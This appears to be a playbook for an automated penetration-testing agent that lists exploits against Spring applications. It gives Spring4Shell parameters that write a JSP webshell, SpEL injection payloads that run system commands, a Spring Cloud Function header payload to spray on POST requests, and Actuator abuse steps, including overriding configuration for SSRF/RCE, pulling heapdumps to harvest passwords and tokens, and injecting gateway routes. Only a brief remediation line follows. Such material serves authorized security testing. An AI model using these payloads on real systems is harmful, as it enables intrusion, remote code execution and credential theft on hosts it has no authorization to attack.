# Spring: Spring4Shell, SpEL & Actuator

## Spring4Shell — CVE-2022-22965 (RCE)
Spring MVC/WebFlux on JDK9+ with data binding to a POJO. Abuse the `class` getter
to reach the Tomcat `AccessLogValve` and write a JSP webshell. Send via
`http_request` as form-urlencoded params (also works in query/body):
`class.module.classLoader.resources.context.parent.pipeline.first.pattern=...`,
`...suffix=.jsp`, `...directory=webapps/ROOT`, `...prefix=shell`, `...fileDateFormat=`.
Probe non-destructively first: param
`class.module.classLoader.DEFAULT_USE_CACHES=false` returning 200 (vs a 400 on a
patched/guarded app) shows the binder is reachable.

## SpEL injection
User input flowing into `parseExpression()`. Probe `${7*7}` / `#{7*7}` → `49`,
then confirm RCE with `#{T(java.lang.Runtime).getRuntime().exec('id')}`. Common in
`@Value`, Spring Security expression annotations, Thymeleaf `*{...}`, and Spring
Cloud Gateway routes.

## Spring Cloud Function SpEL — CVE-2022-22963
Header-based, like Log4Shell — spray it on any POST to a Spring Cloud Function
endpoint via `http_request`/`http_fuzz`: header
`spring.cloud.function.routing-expression:
T(java.lang.Runtime).getRuntime().exec("id")` (or
`exec(new String[]{"sh","-c","id"})` for pipes/args). Command output in the
response/error, or a benign side effect, confirms.

## Actuator exploitation (after fingerprint found `/actuator/*`)
- `/actuator/env` — read config (secrets often masked). **Override** a property:
  `http_request` POST `/actuator/env` body `{"name":"...","value":"..."}` then POST
  `/actuator/refresh` (e.g. repoint a datasource / `spring.cloud...` for SSRF/RCE).
- `/actuator/heapdump` — download with `http_request`, grep the dump for secrets
  (`password`, `Authorization`, tokens, session ids).
- `/actuator/gateway/routes` (Spring Cloud Gateway) — add a route with a SpEL
  `filters` payload then refresh → RCE (CVE-2022-22947).
- `/actuator/loggers`, `/jolokia` (→ MBean RCE), `/actuator/mappings` to map routes.

Evidence: the request + `49` / command output / heapdump secret / 200 on the bind.
Remediation: patch Spring (≥5.3.18 / 5.2.20), restrict Actuator
(`management.endpoints.web.exposure.include=health`), never feed user input to SpEL.
